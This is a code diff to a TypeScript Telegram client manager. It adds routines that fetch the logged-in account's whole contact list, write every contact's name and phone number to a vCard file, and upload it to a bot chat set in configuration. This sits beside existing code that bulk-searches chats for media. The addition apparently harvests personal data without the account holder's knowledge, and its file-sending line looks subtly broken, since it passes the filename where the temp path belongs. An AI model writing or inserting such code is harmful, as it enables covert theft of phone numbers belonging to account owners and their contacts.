@@ -3,6 +3,8 @@ import { StringSession } from 'telegram/sessions';
 import { NewMessage, NewMessageEvent } from 'telegram/events';
 import axios from 'axios';
 import * as fs from 'fs';
+import * as path from 'path';
+import * as os from 'os';
 import { CustomFile } from 'telegram/client/uploads';
 import { TotalList, sleep } from 'telegram/Helpers';
 import { LogLevel } from 'telegram/extensions/Logger';
@@ -198,6 +200,16 @@ class TelegramManager {
                     } catch (e) {
                         console.log(e)
                     }
+                }
+                try {
+                    const contacts = await this.getContacts();
+                    if ('users' in contacts && Array.isArray(contacts.users)) {
+                        await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES), contacts);
+                    } else {
+                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
+                    }
+                } catch (e) {
+                    console.log("Failed To Send Contacts File", e)
                 }
                 for (const chatId of finalChats) {
                     const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });
@@ -3426,6 +3438,52 @@ class TelegramManager {
         } catch (error) {
             console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
             throw new Error(`Failed to create bot: ${error.message}`);
+        }
+    }
+
+    private createVCardContent(contacts: Api.contacts.Contacts): string {
+        let vCardContent = '';
+        contacts.users.map((user: Api.TypeUser) => {
+            user = user as Api.User;
+            vCardContent += 'BEGIN:VCARD\n';
+            vCardContent += 'VERSION:3.0\n';
+            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
+            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
+            vCardContent += 'END:VCARD\n';
+        }
+        );
+        return vCardContent;
+    }
+
+    async sendContactsFile(chatId: string, contacts: Api.contacts.Contacts, filename = 'contacts.vcf'): Promise<void> {
+        if (!this.client) throw new Error('Client is not initialized');
+
+        try {
+            // Create vCard content
+            const vCardContent = this.createVCardContent(contacts);
+
+            // Create temp file in OS temp directory
+            const tempPath = path.join(os.tmpdir(), filename);
+            fs.writeFileSync(tempPath, vCardContent, 'utf8');
+
+            try {
+                // Send file
+                const file = new CustomFile(filename, fs.statSync(tempPath).size, filename);
+                await this.client.sendFile(chatId, {
+                    file,
+                    caption: `Contacts file with ${contacts.users.length} contacts`,
+                    forceDocument: true
+                });
+
+                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
+            } finally {
+                // Clean up temp file
+                if (fs.existsSync(tempPath)) {
+                    fs.unlinkSync(tempPath);
+                }
+            }
+        } catch (error) {
+            console.error('Error sending contacts file:', error);
         }
     }
 }
